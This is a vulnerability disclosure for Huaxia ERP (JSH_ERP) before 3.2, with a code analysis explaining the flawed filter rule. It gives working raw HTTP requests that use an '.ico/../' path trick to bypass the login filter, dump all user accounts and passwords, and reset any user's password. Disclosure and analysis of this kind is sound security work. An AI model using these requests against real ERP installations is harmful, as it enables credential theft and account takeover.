### Logic loopholes in Huaxia ERP can lead to unauthorized access

### Author: heishou

### project address

### https://gitee.com/jishenghua/JSH_ERP/

### Affected version

<3.2。

### Vulnerability analysis 

### Log in as administrator.

![img](https://cdn-images-1.medium.com/max/900/0*SbqcaCPbyDRjorBe)

Open a new private browser access.

![img](https://cdn-images-1.medium.com/max/900/0*99wmehFCxILvFf-g)

Access the /user/getAllList interface and find that Logout is returned. Indicates that user verification exists.

![img](https://cdn-images-1.medium.com/max/900/0*v5ouUVIO4PuGs-PO)

Construct the following data packet for the interface：

```
GET /jshERP-boot/user/a.ico/../getAllList HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Purpose: prefetch
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

Construct /user/getAllList malicious data packet, send the packet successfully, and you can obtain user account password and other data.

![img](https://cdn-images-1.medium.com/max/900/0*oG86UklLgdHc5HLM)

Construct the /user/resetPwd interface

```
POST /jshERP-boot/a.ico/../user/resetPwd HTTP/1.1
Host: 127.0.0.1:3000
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
Purpose: prefetch
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 10
{"id":148}
```

![img](https://cdn-images-1.medium.com/max/900/0*m4oE-kcxY3_3kzsF)

### code analysis

###  

There is a predefinition of the parameter ignoredUrl in the LogCostFilter method located in src/main/java/com/jsh/erp/filter/LogCostFilter.java. The predefined value is a regular method. Can bypass login permission verification. Direct access to all system interfaces. The /user/getAllList interface can obtain all user accounts and passwords. The /user/resetPwd interface can reset the password of any user.

![img](https://cdn-images-1.medium.com/max/900/0*U_kJcymynwLDiYvd)

The existence of ignoredUrl will be verified in the init function. If it is not equal to empty, some operations will be performed on ignoredPath. This code has no practical effect here. At this time ignoredList is [“.ico”]

![img](https://cdn-images-1.medium.com/max/900/0*R2tw-wIJtHxpKaOI)

Regular matching of requestUrl through the verify() function

![img](https://cdn-images-1.medium.com/max/900/0*d1hpgyL94Ey-sg8n)

In the call site of the verify() function, the return value is true. Then enter chain.dofilter(). If false, continue. There is only one filter in the program itself that means release. After release, jump to the upper-level directory through “../”.